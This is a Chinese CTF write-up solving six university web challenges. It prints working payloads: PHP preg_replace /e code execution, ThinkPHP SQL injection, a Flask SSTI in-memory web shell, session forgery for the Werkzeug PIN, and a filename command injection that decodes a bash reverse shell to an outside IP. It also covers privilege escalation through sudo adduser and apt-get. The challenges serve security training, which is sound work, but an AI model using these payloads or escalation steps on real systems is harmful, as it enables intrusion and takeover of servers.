# 记某高校CTF赛WEB全解-先知社区

> **来源**: https://xz.aliyun.com/news/16175  
> **文章ID**: 16175

---

## Please\_RCE\_Me

题目源码如下

```
<?php
if($_GET['moran'] === 'flag'){
    highlight_file(__FILE__);
    if(isset($_POST['task'])&&isset($_POST['flag'])){
        $str1 = $_POST['task'];
        $str2 = $_POST['flag'];
        if(preg_match('/system|eval|assert|call|create|preg|sort|{|}|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i',$str1) || strlen($str2) != 19 || preg_match('/please_give_me_flag/',$str2)){
            die('hacker!');
        }else{
            preg_replace("/please_give_me_flag/ei",$_POST['task'],$_POST['flag']);
        }
    }
}else{
    echo "moran want a flag.</br>(?moran=flag)";
}

```

考点：replace /e命令执行漏洞

由于正则开启了大小写匹配，所以可以用于绕过上面对于please\_give\_me\_flag字符的检测，匹配到了就会执行task的代码，剩下的就是代码绕过了

```
?moran=flag

flag=please_give_me_flaG&task=print(file_get_contents("\x2f\x66\x6c\x61\x67"));
```

## ez\_tp

amazing兄弟，非预期了，想想哥们上次也是被日志打了非预期，尊嘟想啸

简单做下分析吧

App/Home/Controller/IndexController.class.php

这里是tp的初始文件，滑到最下面可以发现如下逻辑

```
if (waf()){
            echo "12311";
            $this->index();
        }else{
            $ret = $User->field('username,age')->where(array('username'=>$name))->select();
            echo "success";
            echo var_export($ret, true);
        }

```

对waf的返回结果进行判断，然后走向不同的代码逻辑，这里大概可以看出来是要让结果返回false，走到sql执行那里，返回上面去看waf

```
$pattern = "insert|update|delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex";
            $pattern.= "|file_put_contents|fwrite|curl|system|eval|assert";
            $pattern.= "|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
            $pattern.= "|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec";
            $vpattern = explode("|", $pattern);
            $bool = false;
            var_dump($input);

```

设置了一堆正则

```
foreach ($input as $k => $v) {
                foreach ($vpattern as $value) {
                    foreach ($v as $kk => $vv) {
                        if (preg_match("/$value/i", $vv)) {
                            $bool = true;
                            break;
                        }
                    }
                    if ($bool) break;
                }
                if ($bool) break;
            }
            return $bool;
        }

```

利用套娃循环检测所有的键值是否含有黑名单字段，如果有就返回true，再往上好像也没什么特殊字段了，但现在有一个问题是如何触发这个h\_n，然后去问了手GPT，得到了答案，大致格式如下

```
index.php/home/index/h_n
```

以此来触发类中的方法，然后就去审代码看逻辑了，碰巧看到了日志，搜一手flag，拿下，paylaod如下

```
index.php/home/index/h_n?name[0]=exp&name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag
```

原本的思路也是根据查询逻辑去查flag，不过非预期了，后面也就没分析了，抽空看吧

## ezFlask

只执行一次，很容易想到内存马，而且题目也给出了任意代码执行，这里构造模板注入进行内存马写入

```
cmd=render_template_string("{{url_for.__globals__['__builtins__']['eval'](\"app.add_url_rule('/shell', 'myshell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd')).read())\",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}}")

```

## flipPin

源代码如下

```
from flask import Flask, request, abort
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from flask import Flask, request, Response
from base64 import b64encode, b64decode

import json

default_session = '{"admin": 0, "username": "user1"}'
key = get_random_bytes(AES.block_size)


def encrypt(session):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return b64encode(iv + cipher.encrypt(pad(session.encode('utf-8'), AES.block_size)))


def decrypt(session):
    raw = b64decode(session)
    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])
    try:
        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode('utf-8')
        return res
    except Exception as e:
        print(e)

app = Flask(__name__)

filename_blacklist = {
    'self',
    'cgroup',
    'mountinfo',
    'env',
    'flag'
}

@app.route("/")
def index():
    session = request.cookies.get('session')
    if session is None:
        res = Response(
            "welcome to the FlipPIN server try request /hint to get the hint")
        res.set_cookie('session', encrypt(default_session).decode())
        return res
    else:
        return 'have a fun'

@app.route("/hint")
def hint():
    res = Response(open(__file__).read(), mimetype='text/plain')
    return res


@app.route("/read")
def file():

    session = request.cookies.get('session')
    if session is None:
        res = Response("you are not logged in")
        res.set_cookie('session', encrypt(default_session))
        return res
    else:
        plain_session = decrypt(session)
        if plain_session is None:
            return 'don\'t hack me'

        session_data = json.loads(plain_session)

        if session_data['admin'] :
            filename = request.args.get('filename')

            if any(blacklist_str in filename for blacklist_str in filename_blacklist):
                abort(403, description='Access to this file is forbidden.')

            try:
                with open(filename, 'r') as f:
                    return f.read()
            except FileNotFoundError:
                abort(404, description='File not found.')
            except Exception as e:
                abort(500, description=f'An error occurred: {str(e)}')
        else:
            return 'You are not an administrator'


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9091, debug=True)

```

看下代码逻辑大概知道是要伪造session，受shiro721影响，看到aes，很容易想到什么什么翻转攻击，再集合恶意payload伪造，就去百度学去了

<https://blog.csdn.net/V1040375575/article/details/111773524>

没看懂

究其根本还是对于session的伪造，结果是将0改成其他数字，所以可以尝试考虑爆破，解码几次分析一下，大概就是在13位的样子，访问两次read，抓包，对于给出的session进行b64码表爆破，多尝试几次，最后会有一个类型不对的返回结果，证明爆破成功，修改对应session，加filename对文件进行读取即可

```
read?filename=巴拉巴拉
```

这里涉及了一个黑名单问题，把self、cgroup给waf了，没遇到过，百度

<https://blog.csdn.net/weixin_63231007/article/details/131659892>

巧不巧，第一个就是

```
过滤 cgroup
用mountinfo或者cpuset
```

最终结果如下

```
probably_public_bits = [
    'ctfUser'  # username 可通过/etc/passwd获取
    'flask.app',  # modname默认值
    'Flask',  # 默认值 getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/lib/python3.9/site-packages/flask/app.py'  # 路径 可报错得到  getattr(mod, '__file__', None)
]

private_bits = [
    '223171425729702',  # /sys/class/net/eth0/address mac地址十进制
    '19088900-1695-441f-9f76-7379c20e5547bf7ece62cf3b189c136c57b05e74107bcb7209ce7bac7c5790d857b5ec7da7b0'
    # 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup
]

```

## GoJava

robots.txt泄露，main-old.zip下载得到源码

```
package main

import (
    "io"
    "log"
    "mime/multipart"
    "net/http"
    "os"
    "strings"
)

var blacklistChars = []rune{'<', '>', '"', '\'', '\\', '?', '*', '{', '}', '\t', '\n', '\r'}

func main() {
    // 设置路由
    http.HandleFunc("/gojava", compileJava)

    // 设置静态文件服务器
    fs := http.FileServer(http.Dir("."))
    http.Handle("/", fs)

    // 启动服务器
    log.Println("Server started on :80")
    log.Fatal(http.ListenAndServe(":80", nil))
}

func isFilenameBlacklisted(filename string) bool {
    for _, char := range filename {
        for _, blackChar := range blacklistChars {
            if char == blackChar {
                return true
            }
        }
    }
    return false
}

func compileJava(w http.ResponseWriter, r *http.Request) {
    // 检查请求方法是否为POST
    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }

    // 解析multipart/form-data格式的表单数据
    err := r.ParseMultipartForm(10 << 20) // 设置最大文件大小为10MB
    if err != nil {
        http.Error(w, "Error parsing form", http.StatusInternalServerError)
        return
    }

    // 从表单中获取上传的文件
    file, handler, err := r.FormFile("file")
    if err != nil {
        http.Error(w, "Error retrieving file", http.StatusBadRequest)
        return
    }
    defer file.Close()

    if isFilenameBlacklisted(handler.Filename) {
        http.Error(w, "Invalid filename: contains blacklisted character", http.StatusBadRequest)
        return
    }
    if !strings.HasSuffix(handler.Filename, ".java") {
        http.Error(w, "Invalid file format, please select a .java file", http.StatusBadRequest)
        return
    }
    err = saveFile(file, "./upload/"+handler.Filename)
    if err != nil {
        http.Error(w, "Error saving file", http.StatusInternalServerError)
        return
    }
}

func saveFile(file multipart.File, filePath string) error {
    // 创建目标文件
    f, err := os.Create(filePath)
    if err != nil {
        return err
    }
    defer f.Close()

    // 将上传的文件内容复制到目标文件中
    _, err = io.Copy(f, file)
    if err != nil {
        return err
    }

    return nil
}

```

真就go写的，简单来说是对java文件进行编译操作，怎么编译的？

javac嘛，javac是什么？

系统命令，后面肯定是要跟上文件名的，所以猜测会有命令注入漏洞，构造恶意命令文件名如下

```
"1;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzI1MCAwPiYxIg== | base64 -d | bash;1.java"

```

这里由于对于文件名进行了部分waf，所以使用编码来避免麻烦，这里执行不知道是不是我电脑的问题，必须使用bash，sh‘连上就断

具体提权的探测过程就不多说了，在根目录有个memorandum，里面是root的密码

```
H2LvFxnWENLqVxE

su root

cat /root/f*
```

## GPTS

gpt\_academic，最近刚搭过这玩意，这就考了，你说巧不巧

<https://xz.aliyun.com/t/14283?time__1311=mqmx9QiQKDqGqx05dIDymDcmrovhG2bD&alichlgref=https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DqSno1OmP9d2CmUVNF6dWlj3IPjQSJnN9EOdDQoHSahQwxVadWoNWhlQH3ZbKBhJV%26wd%3D%26eqid%3D965c761d00710cf200000006664181f0>

开始时一个pickle反序列化漏洞，具体操作博客里面都有，就不具体说了

由于需要提权，所以上一下vshell做下权限维持，用户为ctfgame，上内核探针和信息收集没搜到什么东西，最终在

/var/spool/mail/ctfgame中发现如下内容

```
From root,
To ctfgame(ctfer),

You know that I'm giving you permissions to make it easier for you to build your website, but now your users have been hacked.

This is the last chance, please take care of your security, I helped you reset your account password.

ctfer : KbsrZrSCVeui#+R

I hope you cherish this opportunity.
```

尝试切换用户，切换成功，继续vshell上线

上传linpeas和LinEnum做信息收集（sudo -l）

```
[+] We can sudo without supplying a password!
Matching Defaults entries for ctfer on hnctf-01hxryr832qjjc3astkt4rw4dw:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ctfer may run the following commands on hnctf-01hxryr832qjjc3astkt4rw4dw:
    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
```

收集到如上信息，简单来说

* 用户ctfer可以以root权限运行以下命令，而且无需输入密码：
  + `/usr/sbin/adduser`: 允许执行adduser命令。

```
find / -perm -u=s -type f 2>/dev/null

/bin/mount
/bin/su
/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
```

我们将用户添加到root组

```
sudo adduser ctfer root
sudo adduser --gid 0 chu0
```

新建用户然后切换，然后再进行一次信息收集

读取/etc/sudoers

```
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "@include" directives:

@includedir /etc/sudoers.d
ctfer ALL=(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin
kobe ALL=(root) PASSWD: /usr/bin/apt-get
```

可以发现有一个用户具有apt-get的root权限，尝试新建用户

```
sudo adduser --gid 0 kobe

kobe@hnctf-01hxryr832qjjc3astkt4rw4dw:/tmp$ id
uid=1005(kobe) gid=0(root) groups=0(root)
```

使用apt-get进行提权

```
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

root目录拿到flag

```
cat /root/f*/f*
```
